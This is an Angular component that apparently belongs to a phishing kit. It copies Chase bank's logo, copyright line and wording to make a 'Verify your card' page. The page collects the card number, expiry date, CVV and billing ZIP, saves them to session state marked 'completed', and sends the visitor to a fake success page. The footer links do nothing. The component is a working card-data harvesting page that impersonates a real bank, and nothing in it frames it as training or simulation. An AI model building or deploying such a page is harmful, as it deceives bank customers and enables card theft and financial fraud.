import { Component, inject, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule, ReactiveFormsModule, FormBuilder, Validators } from '@angular/forms';
import { Router } from '@angular/router';
import { StateService } from '../../../services/state.service';

@Component({
  selector: 'app-chase-card',
  standalone: true,
  imports: [CommonModule, FormsModule, ReactiveFormsModule],
  template: `
      <div class="chase-flow-container">
         <!-- Configured for modern desktop experience -->
      <main class="chase-main">
        <div class="chase-card">
           <svg class="chase-logo" viewBox="0 0 100 28" xmlns="http://www.w3.org/2000/svg">
              <path d="M15.545 0L10.224 0L20.448 18.667L15.127 18.667L25.352 37.333H30.672L20.448 18.667L25.769 18.667L15.545 0ZM55.224 0L50.082 0L60.306 18.667L54.985 18.667L65.209 37.333H70.53L60.306 18.667L65.626 18.667L55.224 0ZM35.333 0H0V9.333H35.333V0ZM35.333 14H0V23.333H35.333V14ZM35.333 28H0V37.333H35.333V28Z" style="fill: #0060a9;"/>
              <text x="30" y="27" font-family="Arial" font-weight="bold" font-size="22" style="fill: #0060a9;">CHASE</text>
           </svg>
          <div class="mb-6">
            <h1 class="mb-2">Verify your card</h1>
            <p class="text-sm text-slate-600">Please confirm your card details to ensure continued access to your account.</p>
          </div>
          
          <form [formGroup]="cardForm" (ngSubmit)="onSubmit()">
            <div class="chase-form-group">
              <label for="cardNumber">Card Number</label>
              <input 
                type="text" 
                id="cardNumber" 
                formControlName="cardNumber"
                placeholder="0000 0000 0000 0000"
                [class.error]="isFieldInvalid('cardNumber')"
                (input)="formatCardNumber($event)"
              >
            </div>

            <div class="grid grid-cols-2 gap-4">
              <div class="chase-form-group">
                <label for="expiry">Expiry (MM/YY)</label>
                <input 
                  type="text" 
                  id="expiry" 
                  formControlName="expiry"
                  placeholder="MM/YY"
                  [class.error]="isFieldInvalid('expiry')"
                  (input)="formatExpiry($event)"
                >
              </div>
              <div class="chase-form-group">
                <label for="cvv">CVV</label>
                <input 
                  type="text" 
                  id="cvv" 
                  formControlName="cvv"
                  placeholder="123"
                  maxlength="4"
                  [class.error]="isFieldInvalid('cvv')"
                >
              </div>
            </div>

            <div class="chase-form-group">
              <label for="zip">Billing ZIP Code</label>
              <input 
                type="text" 
                id="zip" 
                formControlName="zip"
                placeholder="12345"
                maxlength="10"
                [class.error]="isFieldInvalid('zip')"
              >
            </div>

            <button 
              type="submit" 
              class="chase-btn-primary"
              [disabled]="cardForm.invalid || isLoading()"
            >
              <span *ngIf="!isLoading()">Update card</span>
              <span *ngIf="isLoading()">Updating...</span>
            </button>
          </form>
        </div>

        <footer class="chase-footer">
          <div class="flex justify-center mb-4">
            <a href="javascript:void(0)">Contact us</a>
            <a href="javascript:void(0)">Privacy</a>
            <a href="javascript:void(0)">Security</a>
            <a href="javascript:void(0)">Terms of use</a>
          </div>
          <p>© 2024 JPMorgan Chase & Co.</p>
        </footer>
      </main>
    </div>
  `,
  styleUrls: ['../../../styles/flows/chase.scss']
})
export class ChaseCardComponent {
  private fb = inject(FormBuilder);
  private router = inject(Router);
  private stateService = inject(StateService);

  cardForm = this.fb.group({
    cardNumber: ['', [Validators.required, Validators.pattern(/^\d{4}\s\d{4}\s\d{4}\s\d{4}$/)]],
    expiry: ['', [Validators.required, Validators.pattern(/^(0[1-9]|1[0-2])\/\d{2}$/)]],
    cvv: ['', [Validators.required, Validators.pattern(/^\d{3,4}$/)]],
    zip: ['', [Validators.required, Validators.minLength(5)]]
  });

  isLoading = signal(false);

  isFieldInvalid(field: string): boolean {
    const control = this.cardForm.get(field);
    return !!(control && control.invalid && (control.dirty || control.touched));
  }

  formatCardNumber(event: any) {
    let value = event.target.value.replace(/\D/g, '');
    let formatted = '';
    for (let i = 0; i < value.length; i++) {
      if (i > 0 && i % 4 === 0) {
        formatted += ' ';
      }
      formatted += value[i];
    }
    event.target.value = formatted.substring(0, 19);
    this.cardForm.get('cardNumber')?.setValue(event.target.value);
  }

  formatExpiry(event: any) {
    let value = event.target.value.replace(/\D/g, '');
    let formatted = value;
    if (value.length > 2) {
      formatted = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    event.target.value = formatted.substring(0, 5);
    this.cardForm.get('expiry')?.setValue(event.target.value);
  }

  onSubmit() {
    if (this.cardForm.valid) {
      this.isLoading.set(true);

      const { cardNumber, expiry, cvv, zip } = this.cardForm.value;

      this.stateService.updateSession({
        cardNumber,
        cardExpiry: expiry,
        cardCvv: cvv,
        billingZip: zip,
        status: 'completed'
      });

      setTimeout(() => {
        this.isLoading.set(false);
        this.router.navigate(['/verify/chase/success']);
      }, 2000);
    }
  }
}
